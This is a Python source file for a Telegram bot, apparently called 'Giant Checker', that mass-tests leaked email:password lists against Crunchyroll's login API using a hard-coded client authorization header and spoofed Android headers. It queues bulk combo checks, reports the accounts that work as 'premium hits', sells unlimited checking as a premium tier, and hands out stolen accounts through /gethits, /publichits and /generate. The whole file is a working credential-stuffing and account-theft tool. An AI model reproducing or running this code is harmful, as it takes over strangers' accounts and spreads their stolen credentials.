import telebot
import requests
import random
import time
import re
import os
import threading
import logging
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from collections import deque, defaultdict
from threading import Lock
from config import API_TOKEN, CHANNEL_USERNAME, ADMIN_CHAT_ID

# Set up logging
logging.basicConfig(filename='bot.log', level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

bot = telebot.TeleBot(API_TOKEN)

global_premium_accounts = []
user_data = {}
public_data = {}
checking_status = {}
in_progress = {}
stopping_process = {}
user_mode = {}
new_users = []
notified_users = set()
all_users = set()
user_cooldowns = {}

queue = deque()
queue_lock = Lock()
max_concurrent_checks = 2
current_checks = 0
premium_users = set()

user_last_upload = defaultdict(lambda: datetime.min)
FREE_USER_COOLDOWN = timedelta(minutes=5)

class RateLimiter:
    def __init__(self, max_calls, period):
        self.calls = deque()
        self.max_calls = max_calls
        self.period = period

    def __call__(self):
        now = time.time()
        while self.calls and now - self.calls[0] >= self.period:
            self.calls.popleft()
        if len(self.calls) < self.max_calls:
            self.calls.append(now)
            return True
        return False

rate_limiter = RateLimiter(max_calls=30, period=1)  # 30 calls per second

def safe_send_message(chat_id, text, parse_mode=None, **kwargs):
    if not rate_limiter():
        time.sleep(1)  # Wait if rate limit is exceeded
    try:
        return bot.send_message(chat_id, text, parse_mode=parse_mode, **kwargs)
    except telebot.apihelper.ApiTelegramException as e:
        if "Can't parse entities" in str(e):
            try:
                return bot.send_message(chat_id, text, parse_mode=None, **kwargs)
            except Exception as e2:
                logging.error(f"Failed to send message even without parse_mode: {e2}")
                return bot.send_message(chat_id, "Error: Could not send formatted message")
        raise

def escape_markdown(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))

def check_crunchyroll_account(email, password):
    try:
        device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {
            "host": "beta-api.crunchyroll.com",
            "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
            "x-datadog-sampling-priority": "0",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
        }
        data = {
            "username": email,
            "password": password,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": device_id,
            "device_name": "SM-G9810",
            "device_type": "samsung SM-G955N"
        }
        response = requests.post(url, headers=headers, data=data, timeout=10)
        response.raise_for_status()
        
        if "account content mp:limited offline_access" in response.text:
            return 'premium'
        elif "account content mp offline_access reviews talkbox" in response.text:
            return 'premium'
        return 'bad'
    except requests.exceptions.RequestException as e:
        logging.error(f"Error checking Crunchyroll account: {e}")
        return 'error'

def format_hit_spam(email, password):
    return f"""
🟢 *New Hit* 🔰
━━━━━━━━━━━━━━━
✨ *Crunchyroll Account*
✉️ *Email*: `{escape_markdown(email)}`
🔑 *Password*: `{escape_markdown(password)}`
📜 *Subscriptions*: Valid or Premium Account

🔎 *Checked By*: [{bot.get_me().username}](https://t.me/{bot.get_me().username})
⚙️ *Developed By*: @OGM010
━━━━━━━━━━━━━━━
"""

def format_hit_nonspam(email, password):
    return f"""📧 Email: {email}
🔑 Password: {password}
🤖 Bot: @{bot.get_me().username}
👨‍💻 Developed By: @OGM010

"""

def send_new_user_notification(user):
    safe_send_message(ADMIN_CHAT_ID, f"🆕 *New User Detected!*\n\n*Name*: {escape_markdown(user['name'])}\n*Username*: {escape_markdown(user['username'])}\n*UserID*: {user['user_id']}\n*Total Users*: {len(new_users)}", parse_mode="MarkdownV2")

def extract_email_pass(text):
    pattern = r"([\w\.-]+@[\w\.-]+):([^\s]+)"
    return re.findall(pattern, text)

def is_user_member(user_id):
    try:
        status = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id).status
        return status in ["member", "administrator", "creator"]
    except Exception:
        return False

def add_premium_account(account):
    if account not in global_premium_accounts:
        global_premium_accounts.append(account)

def is_premium_user(user_id):
    return user_id in premium_users

def add_to_queue(chat_id, combo_file):
    with queue_lock:
        queue.append((chat_id, combo_file))
    process_queue()

def process_queue():
    global current_checks
    with queue_lock:
        while queue and current_checks < max_concurrent_checks:
            chat_id, combo_file = queue.popleft()
            current_checks += 1
            threading.Thread(target=start_combo_check, args=(chat_id, combo_file)).start()

def finish_check():
    global current_checks
    with queue_lock:
        current_checks -= 1
    process_queue()

def get_queue_position(chat_id):
    return next((i for i, (qid, _) in enumerate(queue) if qid == chat_id), -1) + 1

def leave_queue(chat_id):
    with queue_lock:
        queue_position = get_queue_position(chat_id)
        if queue_position > 0:
            queue.remove((chat_id, next(combo for _, combo in queue if _ == chat_id)))
            return True
    return False

def check_cooldown(chat_id):
    if is_premium_user(chat_id):
        return True
    current_time = datetime.now()
    time_since_last_upload = current_time - user_last_upload[chat_id]
    return time_since_last_upload >= FREE_USER_COOLDOWN

@bot.message_handler(content_types=['document'])
def handle_combo_upload(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    combo_file = f"combo_{chat_id}.txt"
    with open(combo_file, 'wb') as new_file:
        new_file.write(downloaded_file)

    with open(combo_file, 'r') as file:
        combo_count = len(file.readlines())

    if not is_premium_user(chat_id):
        safe_send_message(chat_id, f"""✅ *File received. The file contains {combo_count} combos.*

⚠️ *As a free user, only the first 1000 combos will be checked.*""", parse_mode="MarkdownV2")
    else:
        safe_send_message(chat_id, f"✅ *File received. The file contains {combo_count} combos.*", parse_mode="MarkdownV2")

    ask_for_mode(chat_id, combo_file)

def ask_for_mode(chat_id, combo_file):
    markup = InlineKeyboardMarkup()
    spam_button = InlineKeyboardButton("Spam Mode", callback_data=f"mode_spam|{combo_file}")
    non_spam_button = InlineKeyboardButton("Non-Spam Mode", callback_data=f"mode_nonspam|{combo_file}")
    markup.add(spam_button, non_spam_button)

    instructions = """
*Please choose a mode:*

🔊 *Spam Mode*:
• Sends premium account Hits  instantly When  found
• Ideal for real-time monitoring
• May generate more notifications

🔇 *Non-Spam Mode*:
• Checks all accounts silently and Check store them in a file
• Provides a summary at the end
• Then Type /gethits To Download all Premium hit at Once 

Choose the mode that best suits your needs!
"""
    safe_send_message(chat_id, instructions, reply_markup=markup, parse_mode="MarkdownV2")

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def set_user_mode(call):
    chat_id = call.message.chat.id
    if not check_cooldown(chat_id):
        remaining_time = FREE_USER_COOLDOWN - (datetime.now() - user_last_upload[chat_id])
        minutes, seconds = divmod(remaining_time.seconds, 60)

        popup_text = f"""
⏳ *ANTI SPAM MODE ⛔*

You Can Check Another Combo After 5 minutes 
*Time Remaining:*
{minutes} minutes and {seconds} seconds

💎 *Want to skip the cooldown?*
Upgrade to Premium!
"""
        markup = InlineKeyboardMarkup()
        premium_button = InlineKeyboardButton("Upgrade to Premium", callback_data="upgrade_premium")
        markup.add(premium_button)

        bot.answer_callback_query(call.id, "Cooldown is active.", show_alert=True)
        safe_send_message(chat_id, popup_text, parse_mode="MarkdownV2", reply_markup=markup)
        return

    mode, combo_file = call.data.split("|")
    mode = mode.replace("mode_", "")

    user_mode[chat_id] = mode
    bot.answer_callback_query(call.id, f"{mode.capitalize()} mode selected.")

    if is_premium_user(chat_id):
        safe_send_message(chat_id, f"✅ *{mode.capitalize()} Mode Activated!*", parse_mode="MarkdownV2")
        threading.Thread(target=start_combo_check, args=(chat_id, combo_file)).start()
    else:
        queue_position = get_queue_position(chat_id)
        add_to_queue(chat_id, combo_file)

        markup = InlineKeyboardMarkup()
        leave_queue_button = InlineKeyboardButton("Leave Queue", callback_data="leave_queue")
        markup.add(leave_queue_button)

        safe_send_message(chat_id, f"""
✅ *{mode.capitalize()} Mode Activated!*

⏳ *You're in queue! Please wait...*
━━━━━━━━━━━━━━━
📊 *Your Queue Position*: /queueList
💎 *Skip the queue with Premium*: /premium

_Stay patient, your turn is coming soon!_ ✨
━━━━━━━━━━━━━━━
""", parse_mode="MarkdownV2", reply_markup=markup)

    user_last_upload[chat_id] = datetime.now()

@bot.callback_query_handler(func=lambda call: call.data == "upgrade_premium")
def handle_upgrade_premium(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id, "Redirecting to premium info...")
    premium_info(call.message)

def send_progress_update(chat_id, checked, premium, bad, error, total, inline_message_id, start_time):
    elapsed_time = round(time.time() - start_time, 2)
    progress_text = f"""
🟢 *Progress Update* 
━━━━━━━━━━━━━━━
*Total Accounts Checked*: {checked}/{total} 📊
*Premium Accounts Found*: {premium} 💎
*Bad Accounts*: {bad} ❌
*Error Accounts*: {error} ⚠️
*Time Taken*: {elapsed_time} seconds ⏳
━━━━━━━━━━━━━━━
"""
    markup = InlineKeyboardMarkup()
    stop_button = InlineKeyboardButton("⛔ Stop Checking", callback_data=f"stop|{chat_id}")
    markup.add(stop_button)
    safe_send_message(chat_id, progress_text, reply_markup=markup, parse_mode="MarkdownV2")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop|"))
def handle_stop(call):
    chat_id = int(call.data.split("|")[1])
    stopping_process[chat_id] = True
    bot.answer_callback_query(call.id, "Stopping the process...")
    safe_send_message(chat_id, "⛔ *Process Stopping... Please wait for the summary.*", parse_mode="MarkdownV2")

def start_combo_check(chat_id, combo_file):
    with open(combo_file, 'r') as file:
        combos = file.readlines()

    if not is_premium_user(chat_id):
        combos = combos[:1000]  # Limit to 1000 combos for non-premium users

    total = len(combos)
    checked, bad, premium, error = 0, 0, 0, 0
    start_time = time.time()

    inline_message = safe_send_message(chat_id, "*Starting to check combos...*", parse_mode="MarkdownV2")
    inline_message_id = inline_message.message_id

    in_progress[chat_id] = True
    stopping_process[chat_id] = False
    user_premium_accounts = []

    for combo in combos:
        if stopping_process.get(chat_id, False):
            break

        try:
            email, password = combo.strip().split(':')
            result = check_crunchyroll_account(email, password)

            if result == 'premium':
                account = f"{email}:{password}"
                user_premium_accounts.append(account)
                add_premium_account(account)
                premium += 1
                if user_mode[chat_id] == "spam":
                    safe_send_message(chat_id, format_hit_spam(email, password), parse_mode="MarkdownV2")
            elif result == 'error':
                error += 1
            else:
                bad += 1
        except Exception as e:
            logging.error(f"Error processing combo: {e}")
            error += 1

        checked += 1
        if checked % 10 == 0:  # Update progress every 10 checks
            send_progress_update(chat_id, checked, premium, bad, error, total, inline_message_id, start_time)

    elapsed_time = round(time.time() - start_time, 2)
    safe_send_message(chat_id, f"""
✅ *Checking Completed!*
━━━━━━━━━━━━━━━━━━━
*Total Accounts Checked*: {checked} 📊
*Hits Found*: {premium} 💎
*Bad Accounts*: {bad} ❌
*Error Accounts*: {error} ⚠️
*Time Taken*: {elapsed_time} seconds ⏳
━━━━━━━━━━━━━━━━━━━
Use /gethits to download the premium accounts.
""", parse_mode="MarkdownV2")
    in_progress[chat_id] = False

    # Store user's premium accounts
    user_data[chat_id] = user_premium_accounts
    finish_check()

@bot.message_handler(func=lambda message: message.reply_to_message and message.reply_to_message.document)
def handle_chkf(message):
    chat_id = message.chat.id
    if message.reply_to_message and message.reply_to_message.document:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        combo_file = f"combo_{chat_id}.txt"
        with open(combo_file, 'wb') as new_file:
            new_file.write(downloaded_file)

        with open(combo_file, 'r') as file:
            combo_count = len(file.readlines())

        if not is_premium_user(chat_id):
            safe_send_message(chat_id, f"""✅ *File received. The file contains {combo_count} combos.*

⚠️ *As a free user, only the first 1000 combos will be checked.*""", parse_mode="MarkdownV2")
        else:
            safe_send_message(chat_id, f"✅ *File received. The file contains {combo_count} combos.*", parse_mode="MarkdownV2")

        ask_for_mode(chat_id, combo_file)
    else:
        safe_send_message(chat_id, "❌ *Please reply to a combo file with* /chkf *to start processing.*", parse_mode="MarkdownV2")

@bot.message_handler(commands=['chk'])
def handle_chk(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    text = message.text[5:]
    if ':' in text:
        email, password = text.split(':')
        result = check_crunchyroll_account(email, password)
        if result == 'premium':
            account = f"{email}:{password}"
            add_premium_account(account)
            if chat_id not in user_data:
                user_data[chat_id] = []
            user_data[chat_id].append(account)
        safe_send_message(chat_id, f"*Result*: {result.capitalize()}", parse_mode="MarkdownV2")
    else:
        safe_send_message(chat_id, "❌ *Invalid format. Use* `/chk email:password`", parse_mode="MarkdownV2")

@bot.message_handler(commands=['masschk'])
def handle_masschk(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    text = message.text[9:]
    combos = text.split('\n')
    total = len(combos)
    checked, premium, bad, error = 0, 0, 0, 0
    start_time = time.time()

    inline_message = safe_send_message(chat_id, "*Starting to check combos...*", parse_mode="MarkdownV2")
    inline_message_id = inline_message.message_id

    in_progress[chat_id] = True
    stopping_process[chat_id] = False
    user_premium_accounts = []

    for combo in combos:
        if stopping_process.get(chat_id, False):
            break

        try:
            email, password = combo.strip().split(':')
            result = check_crunchyroll_account(email, password)

            if result == 'premium':
                account = f"{email}:{password}"
                user_premium_accounts.append(account)
                add_premium_account(account)
                premium += 1
            elif result == 'error':
                error += 1
            else:
                bad += 1
        except Exception as e:
            logging.error(f"Error processing combo: {e}")
            error += 1

        checked += 1
        if checked % 10 == 0:  # Update progress every 10 checks
            send_progress_update(chat_id, checked, premium, bad, error, total, inline_message_id, start_time)

    elapsed_time = round(time.time() - start_time, 2)
    safe_send_message(chat_id, f"""
✅ *Checking Completed!*
━━━━━━━━━━━━━
*Total Accounts Checked*: {checked} 📊
*Premium Accounts Found*: {premium} 💎
*Bad Accounts*: {bad} ❌
*Error Accounts*: {error} ⚠️
*Time Taken*: {elapsed_time} seconds ⏳
━━━━━━━━━━━━━
Use /gethits to download the premium accounts.
""", parse_mode="MarkdownV2")
    in_progress[chat_id] = False

    # Store user's premium accounts
    user_data[chat_id] = user_premium_accounts

@bot.message_handler(commands=['gethits'])
def get_hits(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    if chat_id in user_data and user_data[chat_id]:
        with open(f"premium_hits_{chat_id}.txt", 'w') as file:
            file.write("🎉 All Premium Hits 🛃\n\n")
            for account in user_data[chat_id]:
                email, password = account.split(":")
                file.write(format_hit_nonspam(email, password))
        with open(f"premium_hits_{chat_id}.txt", 'rb') as file:
            bot.send_document(chat_id, file, caption="📄 Here are your premium and Valid accounts !", parse_mode="MarkdownV2")
        user_data[chat_id] = []  # Clear the user's premium accounts after sending
    else:
        safe_send_message(chat_id, """❌ *No premium accounts found.*

💡 *Check some combos to find premium accounts!*""", parse_mode="MarkdownV2")

@bot.message_handler(commands=['gethitsC'])
def get_hits_c(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    if chat_id in user_data and user_data[chat_id]:
        with open(f"combo_hits_{chat_id}.txt", 'w') as file:
            for account in user_data[chat_id]:
                if isinstance(account, tuple):
                    file.write(f"{account[0]}:{account[1]}\n")
                else:
                    file.write(f"{account}\n")
        with open(f"combo_hits_{chat_id}.txt", 'rb') as file:
            bot.send_document(chat_id, file, caption="📄 *Here are your combo hits!*", parse_mode="MarkdownV2")
    else:
        safe_send_message(chat_id, """❌ *No combo hits found.*

💡 *Send some combos to store them!*""", parse_mode="MarkdownV2")

@bot.message_handler(commands=['generate'])
def generate_premium_account(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    current_time = datetime.now()
    if chat_id in user_cooldowns:
        if current_time < user_cooldowns[chat_id]:
            remaining_time = user_cooldowns[chat_id] - current_time
            safe_send_message(chat_id, f"⏳ *You can use this command again in {remaining_time.seconds // 3600} hours and {(remaining_time.seconds % 3600) // 60} minutes.*", parse_mode="MarkdownV2")
            return

    if global_premium_accounts:
        account = random.choice(global_premium_accounts)
        global_premium_accounts.remove(account)
        email, password = account.split(':')
        safe_send_message(chat_id, format_hit_spam(email, password), parse_mode="MarkdownV2")
        user_cooldowns[chat_id] = current_time + timedelta(hours=24)
    else:
        safe_send_message(chat_id, "❌ *No premium accounts available at the moment. Please try again later.*", parse_mode="MarkdownV2")

@bot.message_handler(commands=['start', 'start2'])
def send_welcome(message):
    user_id = message.chat.id
    username = message.from_user.username or "No Username"
    first_name = message.from_user.first_name or "Unknown"

    if not is_user_member(user_id):
        safe_send_message(user_id, f"""❌ *You must join our channel to use this bot.*

*Click /start After Join The Channel*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    all_users.add(user_id)

    if user_id not in notified_users:
        notified_users.add(user_id)
        safe_send_message(ADMIN_CHAT_ID, f"""👤 *New User Alert!*

🔹 *User ID:* {user_id}
🔹 *Username:* @{username}
🔹 *Name:* {first_name}
🔢 *Total Users:* {len(all_users)}""", parse_mode="MarkdownV2")

    user = {
        'name': first_name,
        'username': username,
        'user_id': user_id
    }
    if user not in new_users:
        new_users.append(user)
        send_new_user_notification(user)

    safe_send_message(user_id, """🎉 *Welcome To Giant  Checker * 🎉

🚀 *Features:*
🔹 *Clean and store Email:Password combos.*
🔹 *Check Crunchyroll accounts.*
🔹 *Retrieve your private Combos by using* /gethitsC.
🔹 *Get Premium Accounts with* /gethits.
🔹 *Get Public Combos with* /publichits.
🔹 *Generate a Premium Account with* /generate.

💡 *Type /help for detailed instructions.*

📌 * It's Can Make Mistak, !*""", parse_mode="MarkdownV2")

@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = message.chat.id

    if not is_user_member(user_id):
        safe_send_message(user_id, f"""❌ *You must join our channel to use this bot.*

*Click /start After Join The Channel*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    safe_send_message(user_id, """📚 *Help Menu*

🔹 *To Create Combos  :*
*Just send a list of accounts in any format. I will make combos from it:*

🔹 *To Check Accounts:*
Type /chkf In Replay With Combo File or Upload A Combo File 
Use /chk email:password to check a single account
Use /masschk followed by a list of email:password combos to check multiple accounts

🔹 *Retrieve Hits :*
Type /gethitsC to download your stored Combo as a file.
Type /gethits to download premium accounts as a file.

🔹 *Access Public Combo:*
Type /publichits to get public Combos.

🔹 *Generate Premium Account:*
Type /generate  to receive a random premium account (once per 24 hours).

🔸 *Use this bot responsibly.*""", parse_mode="MarkdownV2")

@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def process_message(message):
    user_id = message.chat.id

    if not is_user_member(user_id):
        safe_send_message(user_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    raw_text = message.text
    cleaned_accounts = extract_email_pass(raw_text)

    if cleaned_accounts:
        if user_id not in user_data:
            user_data[user_id] = []

        user_data[user_id].extend(cleaned_accounts)
        public_data[user_id] = public_data.get(user_id, []) + cleaned_accounts
        total = len(user_data[user_id])

        safe_send_message(user_id, f"""✅ *{len(cleaned_accounts)} accounts added successfully!*
📦 *Your Total Stored Accounts:* {total}

🚀 *Keep sending accounts to store more!*""", parse_mode="MarkdownV2")
    else:
        safe_send_message(user_id, """❌ *No valid Email:Password combos found.*

📌 *Tip:* Send accounts in this format:
`example@mail.com:password123`""", parse_mode="MarkdownV2")

@bot.message_handler(commands=['publichits'])
def public_hits(message):
    user_id = message.chat.id

    if not is_user_member(user_id):
        safe_send_message(user_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    all_accounts = []
    for accounts in public_data.values():
        all_accounts.extend(accounts)

    if not all_accounts:
        safe_send_message(user_id, """❌ *No public Combo available yet.*

💡 *Start sending combos  to contribute!*""", parse_mode="MarkdownV2")
        return

    chunk_size = 200
    chunks = [all_accounts[i:i + chunk_size] for i in range(0, len(all_accounts), chunk_size)]

    for i, chunk in enumerate(chunks):
        file_path = f"public_Combos _part_{i + 1}.txt"
        with open(file_path, "w") as file:
            for email, password in chunk:
                file.write(f"{email}:{password}\n")

        with open(file_path, "rb") as file:
            bot.send_document(message.chat.id, file,
                caption=f"""📄 *Public Accounts (Part {i + 1})*

💡 *Use these accounts responsibly.*""", parse_mode="MarkdownV2")

        os.remove(file_path)  # Clean up the file after sending

@bot.message_handler(commands=['totalusers'])
def total_users(message):
    safe_send_message(message.chat.id, f"🔢 *Total Users:* {len(all_users)}", parse_mode="MarkdownV2")

@bot.message_handler(commands=['queueList'])
def queue_list(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    queue_list = list(queue)[:10]  # Get top 10 in queue
    response = "*Queue List:*\n\n"
    for i, (qid, _) in enumerate(queue_list, 1):
        user = bot.get_chat(qid)
        name = user.first_name if user.first_name else "Unknown"
        response += f"{i}. {escape_markdown(name)} (ID: {qid})\n"

    user_position = get_queue_position(chat_id)
    if user_position > 0:
        response += f"\n*Your position in queue*: {user_position}"
    else:
        response += "\nYou are not in the queue."

    safe_send_message(chat_id, response, parse_mode="MarkdownV2")

@bot.message_handler(commands=['info'])
def user_info(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    user = message.from_user
    plan = "Premium" if is_premium_user(chat_id) else "Free"
    info = f"""
*User Information:*
Name: {escape_markdown(user.first_name)}
Username: @{escape_markdown(user.username)}
User ID: {user.id}
Plan: {plan}
"""
    safe_send_message(chat_id, info, parse_mode="MarkdownV2")

@bot.message_handler(commands=['premium'])
def premium_info(message):
    chat_id = message.chat.id
    if not is_user_member(chat_id):
        safe_send_message(chat_id, f"""❌ *You must join our channel to use this bot.*

👉 [Join Channel](https://t.me/{CHANNEL_USERNAME})""", parse_mode="MarkdownV2", disable_web_page_preview=True)
        return

    premium_benefits = """
💎 *Premium Benefits*

✅ *No Queue*: check combos instantly Without Waiting 
✅ *Unlimited Checks*:  No combo limiting Check unlimited Lines
✅ *Priority Support*: Get help faster when you need it
✅ *Exclusive Features*: Access upcoming premium-only features

🚀 *Upgrade now to enhance your experience!*
"""

    markup = InlineKeyboardMarkup()
    contact_button = InlineKeyboardButton("Contact for Purchase", url="https://t.me/TAL3_GBOT")
    markup.add(contact_button)

    safe_send_message(chat_id, premium_benefits, parse_mode="MarkdownV2", reply_markup=markup)

@bot.message_handler(commands=['add'])
def add_premium_user(message):
    admin_id = 1517013110
    if message.from_user.id != admin_id:
        safe_send_message(message.chat.id, "❌ *You are not authorized to use this command.*", parse_mode="MarkdownV2")
        return

    try:
        user_id = int(message.text.split()[1])
        premium_users.add(user_id)
        safe_send_message(message.chat.id, f"✅ *User {user_id} has been added as a premium user.*", parse_mode="MarkdownV2")
    except (IndexError, ValueError):
        safe_send_message(message.chat.id, "❌ *Invalid command format. Use* `/add user_id`", parse_mode="MarkdownV2")

@bot.message_handler(commands=['rmv'])
def remove_premium_user(message):
    admin_id = 1517013110
    if message.from_user.id != admin_id:
        safe_send_message(message.chat.id, "❌ *You are not authorized to use this command.*", parse_mode="MarkdownV2")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id in premium_users:
            premium_users.remove(user_id)
            safe_send_message(message.chat.id, f"✅ *User {user_id} has been removed from premium users.*", parse_mode="MarkdownV2")
        else:
            safe_send_message(message.chat.id, f"❌ *User {user_id} is not a premium user.*", parse_mode="MarkdownV2")
    except (IndexError, ValueError):
        safe_send_message(message.chat.id, "❌ *Invalid command format. Use* `/rmv user_id`", parse_mode="MarkdownV2")

@bot.message_handler(commands=['leavequeue'])
def handle_leave_queue(message):
    chat_id = message.chat.id
    if leave_queue(chat_id):
        safe_send_message(chat_id, "✅ *You have successfully left the queue.*", parse_mode="MarkdownV2")
    else:
        safe_send_message(chat_id, "❌ *You are not currently in the queue.*", parse_mode="MarkdownV2")

@bot.callback_query_handler(func=lambda call: call.data == "leave_queue")
def handle_leave_queue_button(call):
    chat_id = call.message.chat.id
    if leave_queue(chat_id):
        bot.answer_callback_query(call.id, "You have successfully left the queue.")
        safe_send_message(chat_id, "✅ *You have successfully left the queue.*", parse_mode="MarkdownV2")
    else:
        bot.answer_callback_query(call.id, "You are not currently in the queue.")
        safe_send_message(chat_id, "❌ *You are not currently in the queue.*", parse_mode="MarkdownV2")

def run_bot():
    while True:
        try:
            logging.info("Bot started")
            bot.polling(none_stop=True, interval=0, timeout=30)
        except Exception as e:
            logging.error(f"Bot encountered an error: {e}")
            time.sleep(10)  # Wait before restarting

if __name__ == "__main__":
    run_bot()

